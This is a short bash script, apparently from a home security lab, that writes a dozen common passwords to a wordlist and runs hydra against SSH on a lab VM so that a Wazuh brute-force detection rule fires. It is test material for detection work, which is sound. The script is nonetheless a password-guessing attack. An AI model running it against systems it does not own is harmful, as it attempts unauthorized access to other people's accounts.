#!/usr/bin/env bash
# LAB USE ONLY. Run on the Kali VM against your own Ubuntu/Wazuh VM on the isolated VMnet8 NAT network.
# Usage: ./hydra_attack.sh <TARGET_IP> <LAB_USER>
set -euo pipefail
TARGET="${1:?usage: $0 <TARGET_IP> <LAB_USER>}"
USER_NAME="${2:?usage: $0 <TARGET_IP> <LAB_USER>}"
WORDLIST=/tmp/passwords.txt

# 12 wrong guesses so the burst crosses the built-in SSH brute-force threshold (8 failures in 120 s)
printf '%s\n' password 123456 admin wrongpass letmein qwerty welcome iloveyou \
  monkey dragon football sunshine > "$WORDLIST"

hydra -l "$USER_NAME" -P "$WORDLIST" "ssh://${TARGET}" -t 4
